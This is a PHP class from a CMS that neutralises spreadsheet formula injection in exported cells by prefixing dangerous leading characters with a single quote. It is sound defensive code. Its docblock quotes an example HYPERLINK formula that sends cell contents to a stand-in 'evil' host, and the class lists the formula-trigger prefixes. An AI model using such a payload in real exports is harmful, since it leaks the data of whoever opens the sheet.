<?php

namespace App\Support;

/**
 * Neutralizes spreadsheet formula injection in exported cell values.
 *
 * Excel, LibreOffice and Google Sheets evaluate a cell whose text begins with
 * `=`, `+`, `-` or `@` as a formula. Content in this CMS is written by tenant
 * users and exported by administrators, so an editor could otherwise store
 * `=HYPERLINK("https://evil/?d="&A1,"Open")` in an ordinary text field and have
 * it exfiltrate the sheet the moment an admin opens the download.
 */
class SpreadsheetValue
{
    /**
     * Characters that make a spreadsheet treat the cell as a formula. The
     * whitespace ones matter because they are stripped before parsing.
     */
    private const DANGEROUS_PREFIXES = ['=', '+', '-', '@', "\t", "\r"];

    /**
     * Prefix a leading formula character with a single quote, which every
     * major spreadsheet reads as "this cell is literal text". A value that already
     * looks escaped gets one more quote, so {@see unescape()} returns it exactly.
     */
    public static function escape(mixed $value): mixed
    {
        if (! is_string($value) || $value === '') {
            return $value;
        }

        return in_array($value[0], self::DANGEROUS_PREFIXES, true) || self::looksEscaped($value) ? "'".$value : $value;
    }

    /** What {@see escape()} was given, for importers reading a file it wrote. */
    public static function unescape(string $value): string
    {
        return self::looksEscaped($value) ? substr($value, 1) : $value;
    }

    private static function looksEscaped(string $value): bool
    {
        return preg_match('/^\'+[=+\-@\t\r]/', $value) === 1;
    }

    /**
     * @param  array<int|string, mixed>  $row
     * @return array<int|string, mixed>
     */
    public static function escapeRow(array $row): array
    {
        return array_map(self::escape(...), $row);
    }
}
